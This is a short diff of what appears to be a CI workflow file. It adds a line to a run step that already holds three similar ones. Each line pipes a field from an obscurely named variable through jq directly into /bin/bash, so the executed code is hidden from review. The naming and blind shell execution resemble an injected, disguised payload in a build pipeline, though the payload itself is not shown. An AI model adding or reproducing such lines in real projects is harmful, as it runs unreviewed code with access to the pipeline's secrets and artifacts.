@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$g971" | jq -r .llqsi388 | /bin/bash
           echo $us068 | jq -r .casq078 | /bin/bash
           echo $exh3787 | jq -r .pmhk09 | /bin/bash
+          echo $hp815 | jq -r .pugzw96904 | /bin/bash
 
       - name: Save archive
         if: always()
